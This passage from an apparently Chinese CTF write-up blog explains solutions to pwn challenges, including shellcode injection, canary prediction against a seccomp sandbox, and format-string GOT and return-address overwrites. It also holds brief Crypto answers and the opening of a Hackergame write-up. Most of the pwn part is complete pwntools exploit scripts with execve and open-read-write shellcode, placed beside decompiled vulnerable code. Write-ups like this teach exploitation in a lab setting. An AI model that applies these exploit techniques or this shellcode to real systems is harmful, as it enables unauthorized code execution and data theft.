class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;index_addr:&quot;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>) </span><br><span class="line">return_addr = addr + <span class="number">0x34</span></span><br><span class="line">success(<span class="string">f&quot;return_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(return_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    push rsp</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    push 0x3b</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor esi, esi</span></span><br><span class="line"><span class="string">    xor edx, edx</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)):</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">0x30</span> + i).encode())</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="built_in">hex</span>(shellcode[i])[<span class="number">2</span>:]).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line"></span><br><span class="line">    byte = return_addr &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">0x28</span> + i).encode())</span><br><span class="line">    sl(<span class="built_in">hex</span>(byte)[<span class="number">2</span>:])</span><br><span class="line">    </span><br><span class="line">    return_addr &gt;&gt;= <span class="number">8</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="white-canary"><a href="#white-canary" class="headerlink" title="white_canary"></a>white_canary</h2><p>vmmap发现bss有可执行的权限，第一次read buf，往一块有可读可写可执行的地址写数据，第二次gets可以溢出，但是seccomp禁用了execve系统调用，然后有个canary，但canary是通过随机数生成出来的</p>
<p>所以思路是先往buf中写orw的shellcode，然后溢出修改返回地址执行这个shellcode把flag读出来</p>
<p>open(flag,0,0)</p>
<p>read(fd,buf,size)</p>
<p>write(fd,buf,size)</p>
<p>用ctypes模拟canary的生成，溢出的时候带上canary就好了，gdb看了一下，是取生成的canary的第八字节，然后写到fs段偏移0x28</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = seccomp_init(<span class="number">2147418112LL</span>, argv, envp);</span><br><span class="line">  seccomp_rule_add(v4, <span class="number">0LL</span>, <span class="number">59LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_load(v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You are lost in a forest of pwn,find the secret of this world&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You find a man,he said:If you want to get out of here, you need to tell me your name!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;tell me something:&quot;</span>);</span><br><span class="line">  gets(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">time_t</span> seed; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  seed = time(<span class="number">0LL</span>) % <span class="number">60</span>;</span><br><span class="line">  srand(seed);</span><br><span class="line">  v2 = rand();</span><br><span class="line">  v3 = rand();</span><br><span class="line">  __writefsqword(</span><br><span class="line">    <span class="number">0x28</span>u,</span><br><span class="line">    (((v2 &gt;&gt; <span class="number">4</span>) ^ (<span class="number">16</span> * v3 + (v3 &gt;&gt; <span class="number">8</span>) * (v2 &lt;&lt; <span class="number">8</span>))) &gt;&gt; <span class="number">32</span>)</span><br><span class="line">  + ((((v2 &gt;&gt; <span class="number">48</span>) + (v2 &lt;&lt; <span class="number">16</span>) * (v3 &gt;&gt; <span class="number">16</span>)) ^ (v3 &lt;&lt; <span class="number">48</span>)) &lt;&lt; <span class="number">32</span>));</span><br><span class="line">  <span class="keyword">return</span> mprotect(&amp;GLOBAL_OFFSET_TABLE_, <span class="number">0x1000</span>uLL, <span class="number">7</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## srand</span></span><br><span class="line">libc = ctypes.CDLL(os.path.join(os.getcwd(), <span class="string">&#x27;libc.so.6&#x27;</span>))</span><br><span class="line">seed = libc.time(<span class="literal">None</span>) % <span class="number">60</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;pwn.node.game.sycsec.com&quot;</span></span><br><span class="line">    port = <span class="number">31936</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">v2 = libc.rand()</span><br><span class="line">v3 = libc.rand()</span><br><span class="line">canary = (((v2 &gt;&gt; <span class="number">4</span>) ^ (<span class="number">16</span> * v3 + (v3 &gt;&gt; <span class="number">8</span>) * (v2 &lt;&lt; <span class="number">8</span>))) &gt;&gt; <span class="number">32</span>) + ((((v2 &gt;&gt; <span class="number">48</span>) + (v2 &lt;&lt; <span class="number">16</span>) * (v3 &gt;&gt; <span class="number">16</span>)) ^ (v3 &lt;&lt; <span class="number">48</span>)) &lt;&lt; <span class="number">32</span>)</span><br><span class="line">canary = canary &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">success(<span class="string">f&quot;Canary -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">orw_shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov edx,0x67616c66</span></span><br><span class="line"><span class="string">push rdx   </span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor esi,esi                    </span></span><br><span class="line"><span class="string">mov eax,0x2  </span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">mov edi,eax</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">push 0x50</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">xor edi,2</span></span><br><span class="line"><span class="string">mov eax,edi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">sa(<span class="string">&quot;Please enter your name:\n&quot;</span>,orw_shellcode)</span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span> - <span class="number">0x8</span>) + p64(canary) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x00000000004040E0</span>)</span><br><span class="line">sla(<span class="string">b&quot;tell me something:\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="fmt1-0-补"><a href="#fmt1-0-补" class="headerlink" title="fmt1.0[补]"></a>fmt1.0[补]</h2><p>咱是笨蛋，这个printf很奇怪，没有想到格式化字符串修改printf的got表，为execve，咱以为是格式化字符串连续写，然后ret2libc，后面看其他师傅的wp后发现，可以修改这个printf的 got表位execve</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char s[80]; // [rsp+0h] [rbp-50h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(s, 0, sizeof(s));</span><br><span class="line">  puts(&quot;Please enter your username: &quot;);</span><br><span class="line">  read(0, s, 0x60uLL);</span><br><span class="line">  printf(&quot;Hello,&quot;);</span><br><span class="line">  printf(s, 0LL);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-e&#x27;]</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./fmt1.0&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># is_debug = 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if(is_debug):</span></span><br><span class="line"><span class="comment">#     p = process()</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     ip = &quot;node4.buuoj.cn&quot;</span></span><br><span class="line"><span class="comment">#     port = 29349</span></span><br><span class="line"><span class="comment">#     p = remote(ip,port)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># def exec_fmt(pad):</span></span><br><span class="line"><span class="comment">#     p = process(&quot;./fmt1.0&quot;)</span></span><br><span class="line">	</span><br><span class="line"><span class="comment">#     p.recvuntil(b&quot;Please enter your username: \n&quot;)</span></span><br><span class="line"><span class="comment">#     p.send(pad)</span></span><br><span class="line"><span class="comment">#     p.recvuntil(b&quot;Hello,&quot;)</span></span><br><span class="line"><span class="comment">#     return p.recv()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fmt = FmtStr(exec_fmt)</span></span><br><span class="line"><span class="comment"># success(f&quot;offset -&gt;&#123;str(fmt.offset)&#125;&quot;)</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./fmt1.0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"><span class="comment"># payload = fmtstr_payload(6,&#123;0x7fffffffe220:0x1337babe&#125;)</span></span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Please enter your username: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4012CA</span></span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;elf.got[<span class="string">&quot;printf&quot;</span>]:elf.plt[<span class="string">&quot;execve&quot;</span>]&#125;)</span><br><span class="line">success(<span class="string">f&quot;payload -&gt;<span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(main)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="fmt2-0-补"><a href="#fmt2-0-补" class="headerlink" title="fmt2.0[补]"></a>fmt2.0[补]</h2><p>有两次printf格式化字符串，第一次泄露一个libc相关的地址和栈上的地址算出libc_base和返回地址，第二次把返回地址修改成one_gadget的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[88]; // [rsp+0h] [rbp-60h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  printf(&quot;frist str:&quot;);</span><br><span class="line">  read(0, buf, 0x50uLL);</span><br><span class="line">  printf(buf);</span><br><span class="line">  putchar(10);</span><br><span class="line">  printf(&quot;second str:&quot;);</span><br><span class="line">  read(0, buf, 0x50uLL);</span><br><span class="line">  printf(buf);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./fmt2.0&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    port = <span class="number">29349</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">r_leek_libc_64 = <span class="keyword">lambda</span> : u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leek_libc_32 = <span class="keyword">lambda</span> : u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">sl(<span class="string">b&quot;aaaa%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;aaaa&quot;</span>)</span><br><span class="line">leek_addr = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">ret_addr = leek_addr + <span class="number">0x68</span></span><br><span class="line">success(<span class="string">f&quot;ret_addr -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot;0x50-&quot;</span>)</span><br><span class="line">read_addr = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">read_addr -= <span class="number">0x12</span></span><br><span class="line">libc_base = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">success(<span class="string">f&quot;libc_base -&gt; <span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">one=<span class="number">0xe3b01</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">payload=fmtstr_payload(<span class="number">6</span>,&#123;ret_addr:libc_base+one&#125;,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="fmt3-0-补"><a href="#fmt3-0-补" class="headerlink" title="fmt3.0[补]"></a>fmt3.0[补]</h2><h2 id="ez-fullprotection-补"><a href="#ez-fullprotection-补" class="headerlink" title="ez_fullprotection[补]"></a>ez_fullprotection[补]</h2><h2 id="mips-补"><a href="#mips-补" class="headerlink" title="mips[补]"></a>mips[补]</h2><h2 id="why-not-puts-补"><a href="#why-not-puts-补" class="headerlink" title="why_not_puts[补]"></a>why_not_puts[补]</h2><h2 id="eva-补"><a href="#eva-补" class="headerlink" title="eva[补]"></a>eva[补]</h2><h1 id="Cypto"><a href="#Cypto" class="headerlink" title="Cypto"></a>Cypto</h1><h2 id="easy-classic"><a href="#easy-classic" class="headerlink" title="easy_classic"></a>easy_classic</h2><p>有些绕</p>
<p>凯撒-&gt;栅栏-&gt;base64-&gt;熊曰-&gt;key base100 emjoy-&gt;playfair</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;classical_1s_fun&#125;</span><br></pre></td></tr></table></figure>

<h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>十六进制转字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYC&#123;Hello_World_Crypto_bibobibo&#125;</span><br></pre></td></tr></table></figure>



</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-28</span><span class="leancloud_visitors"></span><span>About 4747 words, 15 min 49 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/28/hackergame2023/"></a></h3></div><div class="post-content"><div class="card"><p><h2 id="Hackergame-启动"><a href="#Hackergame-启动" class="headerlink" title="Hackergame 启动"></a>Hackergame 启动</h2><p>Hackergame启动！发现校验相似度是在前端校验的，然后通过url传参相似度，传递个100过去就拿到flag了</p>
<h2 id="更深更暗"><a href="#更深更暗" class="headerlink" title="更深更暗"></a>更深更暗</h2><p>在main.js里有一段生成flag的代码，在控制台中调用就好了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">getFlag</span>(<span class="params">token</span>) &#123;</span><br><span class="line">    <span class="comment">// Generate the flag based on user&#x27;s token</span></span><br><span class="line">    <span class="keyword">let</span> hash = <span class="title class_">CryptoJS</span>.<span class="title class_">SHA256</span>(<span class="string">`dEEper_@nd_d@rKer_<span class="subst">$&#123;token&#125;</span>`</span>).<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`flag&#123;T1t@n_<span class="subst">$&#123;hash.slice(<span class="number">0</span>, <span class="number">32</span>)&#125;</span>&#125;`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

